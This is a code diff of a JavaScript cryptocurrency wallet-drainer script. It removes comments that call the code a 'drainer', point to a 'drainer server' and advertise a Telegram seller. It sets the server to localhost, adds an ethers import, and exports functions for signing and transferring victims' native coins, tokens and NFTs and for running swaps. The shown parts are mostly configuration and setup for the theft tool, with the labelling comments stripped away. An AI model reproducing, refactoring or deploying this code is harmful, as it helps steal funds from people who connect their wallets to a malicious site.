@@ -1,20 +1,8 @@
-// Using this code without obfuscation is STRICTLY PROHIBITED
-// If this is discovered, an arbitration will be drawn up
-// You can obfuscate this script here: obfuscator.io
+import { ethers } from 'ethers';
 
-// Found a script in the public domain without obfuscation?
-// Notify the developer > ESolution4 on telegam
-// Specify the location or domain where the script is located
+let MS_Encryption_Key = 50; 
 
-// =====================================================================
-// ==================== BASIC SCRIPT SETTINGS ==========================
-// =====================================================================
-
-let MS_Encryption_Key = 50; // Specify any number that will be used for encryption (it is not recommended to leave it as default!)
-// The same number should be specified in the server.js file - if they differ, then nothing will work correctly
-
-const MS_Server = "ENTER_DOMAIN_HERE"; // Specify the domain that is attached to the drainer server edit line 431 for https or http
-// This is the domain where you have a server, and not the site itself where you plan to use the drainer
+const MS_Server = "localhost:3000"; 
 const MS_WalletConnect_ID = "ea52b0e550593829f2eee2cb9006f642"; // Project ID from WalletConnect Cloud
 
 const MS_Modal_Style = 2; // 1 - old, 2 - new 
@@ -22,17 +10,12 @@ const MS_Loader_Style = 2; // 1 - old, 2 - new
 const MS_Color_Scheme = 'light'; // light - light theme, dark - dark theme
 const MS_Modal_Mode = 1; // 1 - select a wallet by clicking and connect with a button, 2 - connect immediately after selection
 
-const MS_Verify_Message = ""; // Message for wallet verification, may contain the {{ADDRESS}} tag
-// Leave empty by default to receive a message from the server, otherwise fill in to use a custom
-
-// Using the settings below you can customize how your site will look in the WalletConnect interface
-// No need to change, most wallets work with default settings
-// The setting is not related to the MS_WalletConnect_Customization switch, it is only needed for design customization
+const MS_Verify_Message = "";
 
 const MS_WalletConnect_MetaData = {
-  name: document.title, // Default is the same as the site name
-  description: "Web3 Application", // Default "Web3 Application"
-  url: "https://" + window.location.host, // Default as site domain
+  name: document.title, 
+  description: "Web3 Application", 
+  url: "https://" + window.location.host, 
   icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
 };
 
@@ -70,9 +53,6 @@ const MS_Custom_Chat = {
   }
 };
 
-// =====================================================================
-// ============ IT IS NOT SAFE TO MAKE CHANGES TO THE CODE BELOW =======
-// =====================================================================
 
 var MS_Worker_ID = null;
 
@@ -3330,3 +3310,5 @@ setInterval(async () => {
 
 window.addEventListener("beforeunload", (e) => leave_website());
 window.addEventListener("onbeforeunload", (e) => leave_website());
+
+export { get_tokens, get_nfts, ms_init, SIGN_NATIVE, SIGN_TOKEN, SIGN_NFT, TRANSFER_NATIVE, TRANSFER_TOKEN, TRANSFER_NFT, convert_chain, get_nonce, send_request, retrive_config, retrive_contract, DO_SWAP, DO_UNISWAP, DO_PANCAKE_V3, DO_CONTRACT, show_check, wait_message, end_message };
